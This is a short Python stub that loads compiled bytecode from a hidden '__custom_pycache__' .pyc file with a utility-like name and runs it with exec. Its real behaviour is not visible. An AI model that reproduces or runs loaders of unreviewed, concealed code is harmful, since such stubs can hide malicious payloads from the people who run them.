
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'display_utils_43e4f4734a2b4cbb841ce315d507d923.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
